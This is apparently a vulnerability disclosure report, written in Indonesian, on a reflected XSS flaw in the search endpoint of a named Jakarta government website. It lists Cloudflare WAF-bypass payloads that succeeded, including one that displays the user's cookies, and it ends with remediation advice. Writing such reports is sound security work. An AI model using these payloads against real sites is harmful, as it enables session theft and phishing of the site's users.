## **XSS Reflected In Search Function**

**URL** : `https://jalahoaks.jakarta.go.id/search-ajax`  
**Parameter** : `?keyword=`

**Vulnerability Type** : Reflected Cross-Site Scripting (XSS) 

**Severity** : Medium-High

**Overview**

Endpoint search-ajax memiliki celah **Reflected XSS** karena input dari parameter keyword direfleksikan ke halaman tanpa filtering. Cloudflare WAF hanya memblokir beberapa pola tertentu sehingga masih bisa dibypass menggunakan variasi input lain. Kerentanan ini memungkinkan eksekusi JavaScript di browser korban.

### **Steps to Reproduce** :

1.  **Identifikasi Teknologi Website**

    -   Melakukan enumerasi teknologi menggunakan Wappalyzer.
    <br>
    <br>
    -   Screenshot: wappalyzer
    <br>
    
        ![f](./documetation/Screenshot%202025-11-15%20221133.png)
    
        Terlihat bahwa website menggunakan Cloudflare CDN, yang kemungkinan besar berfungsi juga sebagai Web Application Firewall (WAF).


2.  **Uji Refleksi Input (Normal Input Test)**
    
    -   input text biasa ke search bar contoh "xss" dan liat bagaimana website merefleksikan input tersebut
    <br>
    <br>
    -   Screenshot: view source "xss"
    <br>
    
        ![f](./documetation/Screenshot%202025-11-15%20215651.png)
    
3.  **Uji html injection**
   
    -   Menguji apakah aplikasi memproses karakter HTML yang berpotensi berbahaya menggunakan payload `">xss`
    <br>
    <br>
    -   Screenshot: view source ">xss
    <br>
    
        ![f](./documetation/Screenshot%202025-11-15%20215301.png)
    
        karakter HTML tetap diproses dan ditampilkan tanpa filter, menandakan adanya celah injeksi.yang dimana ini bisa ditingkatkan ke serangan xss
    
4.  **Uji Payload XSS Dasar**
    
    - Menggunakan payload dasar XSS untuk melihat apakah JavaScript dapat dieksekusi: `"><script>alert(1)</script>`
    <br>
    <br> 
    
        ![f](./documetation/Screenshot%202025-11-15%20220718.png)
    
        payload berhasil diblokir oleh WAF, yang mengindikasikan adanya filtering terhadap script injection.
    
5.  **Menguji Bypass WAF Cloudflare**
    
    -   Untuk memastikan apakah proteksi WAF dapat dilewati, dilakukan pengujian beberapa payload bypass dari referensi berikut: https://github.com/gprime31/WAF-bypass-xss-payloads/blob/master/Cloudflare%20xss%20payloads

    -   Screenshot: 
    <br>
    
        ![f](./documetation/Screenshot%202025-11-15%20222539.png)
    
    - Menguji beberapa variasi payload untuk mengevaluasi efektivitas WAF:

        `<img/src=x onError="`${x}`;alert(`Ex.Mi`);"> blocked `
        
        `"onx+%00+onpointerenter%3dalert(domain)+x" blocked`
        
        `%27%09);%0d%0a%09%09[1].find(alert)// blocked`
        
        `<svg on onload=(alert)(document.domain)> bypass`
        
        `<img ignored=() src=x onerror=prompt(1)> bypass`

6.  **Uji Payload Bypass yang Berhasil dan Analisis Filtering**
    
    -   Dari beberapa payload bypass Cloudflare yang diuji, sebagian berhasil dieksekusi dan sebagian lainnya diblokir. Hal ini menunjukkan bahwa WAF menerapkan filtering berbasis pola (keyword-based filtering).
    -   Payload yang mengandung `document.cookie` selalu diblokir, sedangkan payload yang memanggil `document.domain` berhasil dijalankan.
    -   Screenshot: contoh payload yang diblokir
    
        ![f](./documetation/Screenshot%202025-11-15%20223048.png)
    
    -   Screenshot: contoh payload yang berhasil
    <br>

        ![f](./documetation/Screenshot%202025-11-15%20223032.png)
    
    - Untuk memastikan bahwa pemblokiran dilakukan berdasarkan keyword tertentu, payload dimodifikasi menjadi versi yang tidak mengandung document.cookie, yaitu: `<svg on onload=(alert)(cookie)>`

    -   Screenshot: payload yang berhasil
    <br>

        ![f](./documetation/Screenshot%20(890).png)
    
        Payload ini berhasil dieksekusi dan menampilkan nilai cookie tanpa terdeteksi oleh WAF.

### **Impact** :
Jika dimanfaatkan oleh penyerang, celah ini dapat digunakan untuk:

- Menjalankan JavaScript dalam konteks domain pemerintah.

- Melakukan phishing bertarget pada masyarakat.

- Defacing melalui manipulasi DOM.

- Membuat pop-up palsu yang menyerupai notifikasi resmi.

- Melakukan rekayasa sosial (fake warning, fake login, fake verification).

- Melakukan redirection ke halaman berbahaya.

- Berpotensi mengakses data sensitif atau sesi pengguna apabila cookie tidak diamankan dengan benar.

### **Recomendation (fix)** :
- Terapkan output encoding (HTML entity encoding) pada data yang direfleksikan.

- Tambahkan input validation dengan whitelist karakter.

- Gunakan Content Security Policy (CSP) untuk mencegah eksekusi script berbahaya.

- Sanitasi karakter berbahaya sebelum ditampilkan.

- Tingkatkan WAF rules agar tidak hanya berbasis pola keyword.

- Hindari merefleksikan input ke halaman tanpa proses sanitasi.

### **Conclusion** :
Celah Reflected XSS ditemukan pada parameter keyword di endpoint search-ajax. Meskipun terdapat proteksi Cloudflare WAF, filtering yang digunakan hanya berbasis pola sehingga masih dapat dibypass menggunakan payload tertentu. Kerentanan ini berpotensi digunakan untuk phishing, manipulasi tampilan, hingga pencurian cookie. Perlu dilakukan perbaikan segera untuk mencegah risiko keamanan pada pengguna situs.